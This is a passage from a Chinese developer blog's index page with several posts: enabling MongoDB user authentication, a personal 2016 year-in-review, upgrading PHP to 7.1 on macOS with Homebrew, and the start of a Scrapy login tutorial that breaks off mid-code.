                          <pre><span class="line">use admin</span><br><span class="line">db.createUser(</span><br><span class="line">   &#123;</span><br><span class="line">     user: <span class="string">"你的用户名"</span>,</span><br><span class="line">     pwd: <span class="string">"你的密码"</span>,</span><br><span class="line">     roles: [ &#123;role:<span class="string">"userAdminAnyDatabase"</span>, db:<span class="string">"admin"</span>&#125; ]</span><br><span class="line">    /<span class="symbol">*</span> All build-in Roles</span><br><span class="line">    Database User Roles: read|<span class="string">readWrite</span></span><br><span class="line"><span class="string">    数据库用户角色：读</span>|<span class="string">读写</span></span><br><span class="line"><span class="string">    Database Admion Roles: dbAdmin</span>|<span class="string">dbOwner</span>|userAdmin</span><br><span class="line">    数据库管理角色：数据库管理员|<span class="string">数据库所有者</span>|<span class="string">用户管理</span></span><br><span class="line"><span class="string">    Cluster Admin Roles: clusterAdmin</span>|<span class="string">clusterManager</span>|<span class="string">clusterMonitor</span>|hostManager</span><br><span class="line">    集群管理角色：</span><br><span class="line">    Backup and Restoration Roles: backup|<span class="string">restore</span></span><br><span class="line"><span class="string">    All-Database Roles: readAnyDatabase</span>|<span class="string">readWriteAnyDatabase</span>|<span class="string">userAdminAnyDatabase</span>|dbAdminAnyDatabase</span><br><span class="line">    所有数据库角色：读所有数据库|<span class="string">读写所有数据库</span>|<span class="string">所有数据库的用户管理员</span>|<span class="string">所有数据库的管理员</span></span><br><span class="line"><span class="string">    Superuser Roles: root */</span></span><br><span class="line"><span class="string">   &#125;</span></span><br><span class="line"><span class="string">)</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>再点击 run 运行即可 会在信息栏中提示 True 现在断开数据库连接、再打开会发现多出一个 admin 的数据库。 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/02/QQ截图20170204001502.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/02/QQ截图20170204001502.png" alt="QQ截图20170204001502"></a> 上面的都做了些什么呢？ 首先我们新建了一个 admin 的数据库（MongoDB 的原则哦、有则切换没有就创建） 然后在 admin 数据中创建了一个用户 和 密码 赋予了这个用户管理 admin 数据库 所有数据库用户的权限。 至于有那些权限 在注释中都有写哦！常用的我估摸着写了个对应意思········· OK！搞定这一部分 就可以开启 MongoDB 的用户认证了！ 怎么开启呢？首先关闭正在运行的 MongoDB：</p>
                  <figure class="highlight vim">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">ps</span> -<span class="keyword">e</span> | <span class="keyword">grep</span> mongod</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>上面的命令会找出 MongoDB 的进程号、然后运行 kill 进程号即可！ 开启 MongoDB：</p>
                  <figure class="highlight jboss-cli">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">mongod <span class="params">--auth</span> <span class="params">--config</span> <span class="string">/etc/mongod.conf</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>意思是：以认证模式 指定/etc/mongod.conf 启动 MongoDB。 加入开机启动：</p>
                  <figure class="highlight jboss-cli">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">echo</span> <span class="string">"mongod --auth --config /etc/mongod.conf"</span> &gt;&gt; <span class="string">/etc/rc.local</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>好了！现在 MongoDB 也配置完成 啦！ 现在如果你需要新建一个用户让其使用数据库 你该怎么做呢？ 像下面这样；首先你需要连接到 admin 数据库！ 在选项 Basic 中照常配置： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/02/QQ20170204-004332@2x.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/02/QQ20170204-004332@2x.png" alt="QQ20170204-004332@2x"></a> 需要额外设置的是 Authentication 选项： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/02/QQ20170204-004627@2x.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/02/QQ20170204-004627@2x.png" alt="QQ20170204-004627@2x"></a> 连接成功后大概是这个样子： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/02/QQ20170204-004930@2x.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/02/QQ20170204-004930@2x.png" alt="QQ20170204-004930@2x"></a> 需要注意的一点是：这个用户只能看到所有的数据库和用户、并不能看到数据！因为我们创建的时候只给了所有数据库用户管理的权限哦！ 然后打开 shell 界面按照创建 admin 的模板执行即可：</p>
                  <figure class="highlight gherkin">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">use 想要创建的数据库</span><br><span class="line">db.createUser(</span><br><span class="line">   &#123;</span><br><span class="line">     user: <span class="string">"想要使用的用户名"</span>,</span><br><span class="line">     pwd: <span class="string">"想要使用的密码"</span>,</span><br><span class="line">     roles: [ &#123;role:<span class="string">"赋予什么样的权限"</span>, db:<span class="string">"创建的数据库"</span>&#125; ]</span><br><span class="line">    /<span class="symbol">*</span> All build-in Roles</span><br><span class="line">    Database User Roles: read|<span class="string">readWrite</span></span><br><span class="line"><span class="string">    数据库用户角色：读</span>|<span class="string">读写</span></span><br><span class="line"><span class="string">    Database Admion Roles: dbAdmin</span>|<span class="string">dbOwner</span>|userAdmin</span><br><span class="line">    数据库管理角色：数据库管理员|<span class="string">数据库所有者</span>|<span class="string">用户管理</span></span><br><span class="line"><span class="string">    Cluster Admin Roles: clusterAdmin</span>|<span class="string">clusterManager</span>|<span class="string">clusterMonitor</span>|hostManager</span><br><span class="line">    集群管理角色：</span><br><span class="line">    Backup and Restoration Roles: backup|<span class="string">restore</span></span><br><span class="line"><span class="string">    All-Database Roles: readAnyDatabase</span>|<span class="string">readWriteAnyDatabase</span>|<span class="string">userAdminAnyDatabase</span>|dbAdminAnyDatabase</span><br><span class="line">    所有数据库角色：读所有数据库|<span class="string">读写所有数据库</span>|<span class="string">所有数据库的用户管理员</span>|<span class="string">所有数据库的管理员</span></span><br><span class="line"><span class="string">    Superuser Roles: root */</span></span><br><span class="line"><span class="string">   &#125;</span></span><br><span class="line"><span class="string">)</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>创建完成后、就可以用创建好的用户名和密码去链接有权限的数据库啦！！是不是 So Easy！！！ 其实吧 还是 bindIp 安全 哈哈哈！ 以上完毕！！ 下一篇就是基于 Scrapy-Redis 的分布式了、真的超级简单！简单得不要不要的</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/哎哟卧槽" class="author" itemprop="url" rel="index">哎哟卧槽</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2017-02-04 00:59:05" itemprop="dateCreated datePublished" datetime="2017-02-04T00:59:05+08:00">2017-02-04</time>
                </span>
                <span id="/4020.html" class="post-meta-item leancloud_visitors" data-flag-title="Scrapy分布式的前篇--让redis和MongoDB安全点" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>4.8k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>4 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/3998.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> 个人日记 <i class="label-arrow"></i>
                  </a>
                  <a href="/3998.html" class="post-title-link" itemprop="url">回首我的二零一六</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>没有选择那个二零一六年尾，而是选择了这个二零一六年尾来总结。</p>
                  <p>毕竟元旦那时候真的被一堆考试烦透，说到考试，可以说我是极其反对这种形式，在我看来，因为有了考试，学一门课反倒成了任务，而不是真正踏实地去学，有了考试，学习的目的不再是单纯学习，而是为了最后的应考。所以很多科目，经验之谈，一旦它成了我的课程，我反倒没有那么多耐心去学它。而又有很多考试，理解性的东西真的不考察理解，你背过，就高分了，背不过，那就没分。做到原题了，就有分了，做不到原题，那就不一定有分。到头来，一门课程的结束伴随着你仅仅在短时间内记忆了一些概念和题目去应考。考试结束，抛掉了，你还记得什么？何况，某些课，你可能这辈子都用不到了。 然而就是这样，或许真的没有比这更合适的考察方式了吧。 果然一扯就停不下来，后面简单点扯。 嗯，就是这样，我来北航读研了，2016级的新生，刚刚渡过了研究生第一个学期。这个学期，基本上把研究生所有的课都上完。我能体会到自己还是偏重于实践性的东西而非理论，一个想法，纯理论都是空谈，实现出来才是最终目标。作为一名程序猿，平时我喜欢瞎捣腾些东西，逛GitHub，搜开源项目，找到有趣的组件来实现自己想要的功能。 二零一六年上半年，毕设的一段时间吧，由于自己对爬虫比较感兴趣，正好毕设也有个选题是关于爬虫的，所以干脆毕设就实现了一个分布式爬虫框架，虽然也是开源项目组合起来的，Scrapy，Redis，Mongo，Splash，Django等等吧，不过这个过程的探索也是受益匪浅。哦对了，也是上半年这个时候吧，换上了自己的第一台Mac，联想也终于寿终正寝了，我也算是真正踏上了程序员的行列。一年下来，不得不说，开发真的太便捷。 那时候正好是大四，也没多少事，期间也接着大大小小的外包，赚点外快，后来又入手了单反，然而到现在我发现自己没有那么狂爱摄影。 每年都有毕业季，今年轮到我们了。毕业行去了云南，还有些意犹未尽的感觉，也感谢一路同行的小伙伴给我拍的绝世美照哈哈。后来忙着毕业照啦，穿上学士服，辗转各大校区，各种奇怪的姿势拍拍拍。现在真的挺想念山大的，那里的人儿，那里的事儿。嗯，毕业快乐。 暑假，我又回到北京。一件重要的事那就是女朋友保研，虽然中间出了点小叉子，不过还是恭喜她能被中科院录取，随后在北京呆了近整个暑假。 随之而来的，便是北航研究生的新学期了。嗯，从山大到了北航。开学时我并没有那么欣喜，或许是已经过来太多次了习惯了。上学期课满满当当，然而你以为我会乖乖听课？我可不是那种学霸。我总是有着自己的学习和项目计划，学习一些我觉得有用的东西，比如Andrew Ng的机器学习、Web相关知识还有在做自己在忙的一些项目。前面说了我不喜欢上课，不喜欢考试，因为我觉得这些时间，可以去做更有意义的事情。最后几个星期突击一下就好了。其实我的大学就是这么过来的，上课都在学习别的和撸代码去了，成绩也还说得过去，不过感觉这样还是挺充实的。然而考前突击的时候是难了点儿，因为大部分我得预习。还好，这学期过去了，后面的时间我终于可以尽情做我想做的事情了，喜欢无拘无束自己探索的感觉。 期间其实还在和同学创业，演艺行业平台，自己负责技术这方面，好玩表演（hwby.com），一年来了吧，网站实现后投入运营，前期还是非常艰难，不过近期也还是有了起色，继续加油。写的过程中也抽离出了自己的一套CMS，以便后期开发应用的时候更加便捷，现在还不成熟，暂未公开。 说一件值得骄傲的事情吧，每天坚持记有道，把每天完成的事情，成功的事情，失败的事情每天做一下总结，这种感觉似乎是记录了自己路途的脚印，自己能感觉出自己走了多远，收获了多少，有一种自我激励的感觉。从14年开始记录到到今天了，希望自己能坚持下去。 哦又想到一个，之前博客上会有很多人加我，后来我想，干脆建一个交流群多好，于是乎在九月份左右，进击的Coder诞生了，三个多月的时间吧，几乎每天都有人加，刚才看了下已经788人啦，在群里跟大家探讨经验，交流技术，没事吐吐槽，扯扯淡，真的很愉快，爱你们。 然而现在还是觉得自己有时候懒癌发作之后就什么也不想干，执行力差，定了一些计划，今天拖明天，明天拖后天，最后就那么不了了之了。半年前定的学习鬼步舞呢，到现在跳的依然那么差。说好的练好腹肌呢，现在似乎没多大效果。 总结了这么多，似乎也没有多么值得骄傲的一件事，算是瞎忙了一整年吧哈哈。 新年计划： 1.写一本爬虫的书并出版，出套算不上教程的经验分享 2.完善好我的CMS，长期维护下去 3.学习数据挖掘和Web安全，向大牛进发 4.懒癌，不敢说改掉，但也能稍微缓解下吧 5.好玩表演，燥起来。 太多太多…. 觉得自己不会的还是太多，想学的也太多，好好提高自己的执行力和自制力吧，新的一年成为更好的自己。 凌晨三点了，安。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2017-01-27 02:49:20" itemprop="dateCreated datePublished" datetime="2017-01-27T02:49:20+08:00">2017-01-27</time>
                </span>
                <span id="/3998.html" class="post-meta-item leancloud_visitors" data-flag-title="回首我的二零一六" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>2k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>2 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/3992.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> PHP <i class="label-arrow"></i>
                  </a>
                  <a href="/3992.html" class="post-title-link" itemprop="url">Mac下升级PHP版本至7.1</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>博主在搞Web开发主要采用的是Laravel，然而发现其对PHP版本的要求是越来越高，PHP5.6已经越来受到限制，Laravel 5.5将正式弃用PHP5.6，所以博主决定直接升级到7.1版本。</p>
                  <h2 id="移除旧版本"><a href="#移除旧版本" class="headerlink" title="移除旧版本"></a>移除旧版本</h2>
                  <p>由于系统本身已经装了PHP5.6，所以需要先将其移除。 在这里列出目录以及移除需要的命令。</p>
                  <figure class="highlight groovy">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="regexp">/private/</span>etc/               sudo rm -rf php-fpm.conf.<span class="keyword">default</span> php.ini php.ini.<span class="keyword">default</span></span><br><span class="line"><span class="regexp">/usr/</span>bin/               sudo rm -rf php php-config phpdoc phpize</span><br><span class="line"><span class="regexp">/usr/</span>include                sudo rm -rf php</span><br><span class="line"><span class="regexp">/usr/</span>lib                sudo rm -rf php</span><br><span class="line"><span class="regexp">/usr/</span>sbin               sudo rm -rf php-fpm</span><br><span class="line"><span class="regexp">/usr/</span>share              sudo rm -rf php</span><br><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/man/</span>man1         sudo rm -rf php-config<span class="number">.1</span> php<span class="number">.1</span> phpize<span class="number">.1</span></span><br><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/man/</span>man8         sudo rm -rf php-fpm<span class="number">.8</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>顺次手动删除它们即可。</p>
                  <h2 id="搞清关系"><a href="#搞清关系" class="headerlink" title="搞清关系"></a>搞清关系</h2>
                  <p>在卸载过程中你会发现有PHP、FastCGI、php-fpm、spawn-fcgi等等的概念，所以在这里先梳理一下。</p>
                  <h3 id="CGI"><a href="#CGI" class="headerlink" title="CGI"></a>CGI</h3>
                  <p>CGI是为了保证web server传递过来的数据是标准格式的，方便CGI程序的编写者。 web server（比如说nginx）只是内容的分发者。比如，如果请求<code>/index.html</code>，那么web server会去文件系统中找到这个文件，发送给浏览器，这里分发的是静态数据。好了，如果现在请求的是<code>/index.php</code>，根据配置文件，nginx知道这个不是静态文件，需要去找PHP解析器来处理，那么他会把这个请求简单处理后交给PHP解析器。Nginx会传哪些数据给PHP解析器呢？url要有吧，查询字符串也得有吧，POST数据也要有，HTTP header不能少吧，好的，CGI就是规定要传哪些数据、以什么样的格式传递给后方处理这个请求的协议。仔细想想，你在PHP代码中使用的用户从哪里来的。 当web server收到<code>/index.php</code>这个请求后，会启动对应的CGI程序，这里就是PHP的解析器。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定CGI规定的格式返回处理后的结果，退出进程。web server再把结果返回给浏览器。</p>
                  <h3 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h3>
                  <p>Fastcgi是用来提高CGI程序性能的。 那么CGI程序的性能问题在哪呢？”PHP解析器会解析php.ini文件，初始化执行环境”，就是这里了。标准的CGI对每个请求都会执行这些步骤（不闲累啊！启动进程很累的说！），所以处理每个时间的时间会比较长。这明显不合理嘛！那么Fastcgi是怎么做的呢？首先，Fastcgi会先启一个master，解析配置文件，初始化执行环境，然后再启动多个worker。当请求过来时，master会传递给一个worker，然后立即可以接受下一个请求。这样就避免了重复的劳动，效率自然是高。而且当worker不够用时，master可以根据配置预先启动几个worker等着；当然空闲worker太多时，也会停掉一些，这样就提高了性能，也节约了资源。这就是fastcgi的对进程的管理。</p>
                  <h3 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h3>
                  <p>是一个实现了Fastcgi的程序，被PHP官方收了。 大家都知道，PHP的解释器是php-cgi。php-cgi只是个CGI程序，他自己本身只能解析请求，返回结果，不会进程管理（皇上，臣妾真的做不到啊！）所以就出现了一些能够调度php-cgi进程的程序，比如说由lighthttpd分离出来的spawn-fcgi。好了PHP-FPM也是这么个东东，在长时间的发展后，逐渐得到了大家的认可（要知道，前几年大家可是抱怨PHP-FPM稳定性太差的），也越来越流行。 php-fpm的管理对象是php-cgi。但不能说php-fpm是fastcgi进程的管理器，因为前面说了fastcgi是个协议，似乎没有这么个进程存在，就算存在php-fpm也管理不了他（至少目前是）。 有的说，php-fpm是php内核的一个补丁 以前是对的。因为最开始的时候php-fpm没有包含在PHP内核里面，要使用这个功能，需要找到与源码版本相同的php-fpm对内核打补丁，然后再编译。后来PHP内核集成了PHP-FPM之后就方便多了，使用<code>\--enalbe-fpm</code>这个编译参数即可。</p>
                  <h2 id="安装PHP7-1"><a href="#安装PHP7-1" class="headerlink" title="安装PHP7.1"></a>安装PHP7.1</h2>
                  <p>用brew进行安装。</p>
                  <figure class="highlight armasm">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">brew </span>install homebrew/php/php71</span><br><span class="line"><span class="keyword">brew </span>install homebrew/php/php71-mcrypt</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>安装完了之后它会自带PHP-FPM，在 启动PHP-FPM</p>
                  <figure class="highlight ebnf">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attribute">sudo php-fpm</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h3 id="配置文件目录"><a href="#配置文件目录" class="headerlink" title="配置文件目录"></a>配置文件目录</h3>
                  <p>php.ini</p>
                  <figure class="highlight awk">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="regexp">/usr/</span>local<span class="regexp">/etc/</span>php<span class="regexp">/7.1/</span>php.ini</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>php-fpm.conf</p>
                  <figure class="highlight awk">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="regexp">/usr/</span>local<span class="regexp">/etc/</span>php<span class="regexp">/7.1/</span>php-fpm.conf</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>php-fpm</p>
                  <figure class="highlight awk">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="regexp">/usr/</span>local<span class="regexp">/opt/</span>php71<span class="regexp">/sbin/</span>php-fpm</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>但是执行<code>php-fpm</code>发现没有反应，所以这里需要加一个symlink</p>
                  <figure class="highlight awk">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">ln -s <span class="regexp">/usr/</span>local<span class="regexp">/opt/</span>php71<span class="regexp">/sbin/</span>php-fpm <span class="regexp">/usr/</span>local<span class="regexp">/bin/</span>php-fpm</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>然后运行php-fpm</p>
                  <figure class="highlight ebnf">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attribute">sudo php-fpm</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>启动nginx</p>
                  <figure class="highlight ebnf">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attribute">sudo nginx</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>关于MySQL和其他的安装在这就不再赘述。 以上便完成了PHP的升级。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2017-01-26 22:05:48" itemprop="dateCreated datePublished" datetime="2017-01-26T22:05:48+08:00">2017-01-26</time>
                </span>
                <span id="/3992.html" class="post-meta-item leancloud_visitors" data-flag-title="Mac下升级PHP版本至7.1" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>2.3k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>2 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/3952.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/3952.html" class="post-title-link" itemprop="url">小白进阶之Scrapy第二篇（登录篇）</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161021225948.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161021225948.jpg" alt="QQ图片20161021225948"></a>其实拿这个网站当教程刚开始我是拒绝、换其他网站吧，又没什么动力···· 然后就··········· 上一篇 Scrapy 带大家玩了 Spider 今天带带大家玩的东西有两点、第一 CrawlSpider、第二 Scrapy 登录。 目标站点：www.haoduofuli.wang <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/9555112.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/9555112.jpg" alt="9555112"></a> Go Go Go！开整！ 还记得第一步要干啥？ 创建项目文件啊！没有 Scrapy 环境的小伙伴们请参考第一篇安装一下环境哦！ 打开你的命令行界面（Windows 是 CMD）使用切换目录的命令到你需要的存放项目文件的磁盘目录</p>
                  <figure class="highlight properties">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attr">D</span>:<span class="string"></span></span><br><span class="line"><span class="attr">scrapy</span> <span class="string">startproject haoduofuli</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>好了 我在 D 盘创建了一个叫做 haoduofuli 的项目。 用 Pycharm 打开这个目录开始我们的爬取之路 Come on！ 下一步我们该做什么记得吧？当然是在 items.py 中声明字段了！方便我们在 Spider 中保存获取的内容并通过 Pipline 进行保存（items.py 本质上是一个 dict 字典） 我在 items.py 中声明了以下类容：</p>
                  <figure class="highlight mipsasm">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Define here the models for your scraped items</span></span><br><span class="line">#</span><br><span class="line"><span class="comment"># See documentation in:</span></span><br><span class="line"><span class="comment"># http://doc.scrapy.org/en/latest/topics/items.html</span></span><br><span class="line"></span><br><span class="line">import <span class="keyword">scrapy</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">class </span>HaoduofuliItem(<span class="keyword">scrapy.Item):</span></span><br><span class="line"><span class="keyword"> </span>   <span class="comment"># define the fields for your item here like:</span></span><br><span class="line">    <span class="comment"># name = scrapy.Field()</span></span><br><span class="line"></span><br><span class="line">    category = <span class="keyword">scrapy.Field() </span><span class="comment">#类型</span></span><br><span class="line">    title = <span class="keyword">scrapy.Field() </span> <span class="comment">#标题</span></span><br><span class="line">  